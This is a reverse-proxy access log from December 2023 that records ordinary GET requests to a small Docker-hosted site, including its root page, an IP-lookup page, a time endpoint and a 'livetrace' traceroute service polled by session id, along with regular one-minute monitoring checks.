65.153.45.109 - - [14/Dec/2023:04:33:50 +0000] "GET /trace/poll.php?id=e3ef0vsf7 HTTP/2.0" 200 358 "-" "-" 539 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:33:51 +0000] "GET /trace/poll.php?id=e3ef0vsf7 HTTP/2.0" 200 415 "-" "-" 540 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:33:52 +0000] "GET /trace/poll.php?id=e3ef0vsf7 HTTP/2.0" 200 472 "-" "-" 541 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:33:53 +0000] "GET /trace/poll.php?id=e3ef0vsf7 HTTP/2.0" 200 529 "-" "-" 542 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:33:54 +0000] "GET /trace/poll.php?id=e3ef0vsf7 HTTP/2.0" 200 540 "-" "-" 543 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 544 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 545 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 546 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 547 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 548 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:36:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 549 "www@docker" "http://172.25.0.8:80" 1ms
164.52.0.93 - - [14/Dec/2023:04:36:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 550 "-" "-" 0ms
164.52.0.93 - - [14/Dec/2023:04:36:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 551 "-" "-" 0ms
164.52.0.93 - - [14/Dec/2023:04:36:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 552 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:04:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 553 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 554 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 555 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 556 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 557 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 558 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 559 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:40:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 560 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 561 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 562 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 563 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 564 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 565 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 566 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 567 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 568 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 569 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:45:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 570 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 572 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 573 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 574 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 575 "www@docker" "http://172.25.0.8:80" 39ms
167.71.120.76 - - [14/Dec/2023:04:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 576 "www@docker" "http://172.25.0.8:80" 14ms
65.153.45.109 - - [14/Dec/2023:04:49:21 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 577 "www@docker" "http://172.25.0.8:80" 30ms
65.153.45.109 - - [14/Dec/2023:04:49:22 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 578 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:23 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 579 "www@docker" "http://172.25.0.8:80" 3ms
159.203.109.206 - - [14/Dec/2023:04:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 580 "www@docker" "http://172.25.0.8:80" 34ms
65.153.45.109 - - [14/Dec/2023:04:49:24 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 581 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:25 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 582 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:26 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 583 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:27 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 584 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:28 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 585 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:29 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 586 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:30 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 587 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:31 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 588 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:32 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 589 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:33 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 590 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:34 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 591 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:35 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 592 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:36 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 593 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:37 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 594 "www@docker" "http://172.25.0.8:80" 3ms
167.71.120.76 - - [14/Dec/2023:04:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 595 "www@docker" "http://172.25.0.8:80" 17ms
65.153.45.109 - - [14/Dec/2023:04:49:38 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 596 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:39 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 597 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:40 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 598 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:41 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 599 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:42 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 600 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:44 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 601 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:45 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 602 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:46 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 603 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:47 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 604 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:48 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 605 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:49 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 606 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:50 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 607 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:51 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 608 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:52 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 609 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:53 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 610 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:54 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 611 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:55 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 612 "www@docker" "http://172.25.0.8:80" 3ms
65.153.45.109 - - [14/Dec/2023:04:49:56 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 613 "www@docker" "http://172.25.0.8:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:49:56 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 614 "www@docker" "http://172.25.0.8:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:49:56 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 615 "www@docker" "http://172.25.0.8:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:07 +0000] "GET /ip/ HTTP/2.0" 200 864 "-" "-" 616 "www@docker" "http://172.25.0.8:80" 64ms
65.153.45.109 - - [14/Dec/2023:04:50:14 +0000] "GET /trace/ HTTP/2.0" 200 389 "-" "-" 617 "livetrace@docker" "http://172.25.0.5:80" 19ms
65.153.45.109 - - [14/Dec/2023:04:50:14 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 618 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:14 +0000] "GET /trace/start.php?id=483sby2su HTTP/2.0" 200 103 "-" "-" 619 "livetrace@docker" "http://172.25.0.5:80" 4ms
65.153.45.109 - - [14/Dec/2023:04:50:15 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 620 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:16 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 621 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:17 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 622 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:18 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 623 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:19 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 624 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:20 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 625 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:21 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 626 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:22 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 627 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:23 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 628 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 629 "www@docker" "http://172.25.0.8:80" 0ms
65.153.45.109 - - [14/Dec/2023:04:50:24 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 630 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:25 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 631 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:26 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 632 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:27 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 633 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:28 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 634 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:04:50:29 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 635 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:30 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 636 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:31 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 637 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:32 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 83 "-" "-" 638 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:04:50:33 +0000] "GET /trace/poll.php?id=483sby2su HTTP/2.0" 200 245 "-" "-" 639 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 640 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 641 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:51:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 642 "www@docker" "http://172.25.0.8:80" 2ms
173.48.140.140 - - [14/Dec/2023:04:52:15 +0000] "GET /ip/ HTTP/2.0" 200 895 "-" "-" 643 "www@docker" "http://172.25.0.8:80" 36ms
173.48.140.140 - - [14/Dec/2023:04:52:17 +0000] "GET /ip/ HTTP/2.0" 200 895 "-" "-" 644 "www@docker" "http://172.25.0.8:80" 5ms
173.48.140.140 - - [14/Dec/2023:04:52:19 +0000] "GET /trace/ HTTP/2.0" 304 0 "-" "-" 645 "livetrace@docker" "http://172.25.0.5:80" 34ms
173.48.140.140 - - [14/Dec/2023:04:52:19 +0000] "GET /trace/start.php?id=j4wos6uab HTTP/2.0" 200 104 "-" "-" 646 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:04:52:20 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 234 "-" "-" 647 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:04:52:21 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 309 "-" "-" 648 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:04:52:22 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 383 "-" "-" 649 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:04:52:23 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 457 "-" "-" 650 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:04:52:24 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 531 "-" "-" 651 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 652 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:04:52:25 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 605 "-" "-" 653 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:04:52:26 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 680 "-" "-" 654 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:04:52:27 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 754 "-" "-" 655 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:04:52:28 +0000] "GET /trace/poll.php?id=j4wos6uab HTTP/2.0" 200 1055 "-" "-" 656 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 657 "www@docker" "http://172.25.0.8:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 658 "www@docker" "http://172.25.0.8:80" 23ms
172.58.57.121 - - [14/Dec/2023:04:53:21 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 659 "www@docker" "http://172.25.0.8:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:53:21 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 660 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 661 "www@docker" "http://172.25.0.8:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:53:25 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 662 "www@docker" "http://172.25.0.8:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:53:33 +0000] "GET /trace HTTP/2.0" 200 389 "-" "-" 663 "livetrace@docker" "http://172.25.0.5:80" 17ms
172.58.57.121 - - [14/Dec/2023:04:53:33 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 664 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 665 "www@docker" "http://172.25.0.8:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:54:06 +0000] "GET /ip HTTP/2.0" 301 169 "-" "-" 666 "www@docker" "http://172.25.0.8:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:06 +0000] "GET /ip/ HTTP/1.1" 301 17 "-" "-" 667 "web-to-websecure@internal" "-" 0ms
172.58.57.121 - - [14/Dec/2023:04:54:06 +0000] "GET /ip/ HTTP/2.0" 200 864 "-" "-" 668 "www@docker" "http://172.25.0.8:80" 4262ms
172.58.57.121 - - [14/Dec/2023:04:54:11 +0000] "GET /ip/styles.css HTTP/2.0" 304 0 "-" "-" 669 "www@docker" "http://172.25.0.8:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:16 +0000] "GET /ip/ HTTP/2.0" 200 864 "-" "-" 670 "www@docker" "http://172.25.0.8:80" 3069ms
159.203.109.206 - - [14/Dec/2023:04:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 671 "www@docker" "http://172.25.0.8:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:54:29 +0000] "GET /trace/ HTTP/2.0" 200 389 "-" "-" 672 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:30 +0000] "GET /trace/styles.css HTTP/2.0" 200 598 "-" "-" 673 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:30 +0000] "GET /trace/script.js HTTP/2.0" 200 1188 "-" "-" 674 "livetrace@docker" "http://172.25.0.5:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:54:30 +0000] "GET /trace/start.php?id=slp8bpb9e HTTP/2.0" 200 103 "-" "-" 675 "livetrace@docker" "http://172.25.0.5:80" 3ms
172.58.57.121 - - [14/Dec/2023:04:54:31 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 676 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:32 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 677 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:33 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 678 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:34 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 679 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:35 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 680 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:36 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 681 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:37 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 682 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.57.121 - - [14/Dec/2023:04:54:38 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 683 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [14/Dec/2023:04:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 684 "www@docker" "http://172.25.0.8:80" 0ms
172.58.57.121 - - [14/Dec/2023:04:54:39 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 685 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:40 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 686 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:41 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 687 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.57.121 - - [14/Dec/2023:04:54:42 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 688 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:43 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 689 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:44 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 690 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:45 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 691 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.57.121 - - [14/Dec/2023:04:54:46 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 692 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:47 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 693 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:48 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 83 "-" "-" 694 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.57.121 - - [14/Dec/2023:04:54:49 +0000] "GET /trace/poll.php?id=slp8bpb9e HTTP/2.0" 200 245 "-" "-" 695 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:04:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 696 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 697 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 698 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 699 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 700 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:04:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 701 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 702 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 703 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:04:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 704 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:04:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 705 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 706 "www@docker" "http://172.25.0.8:80" 1ms
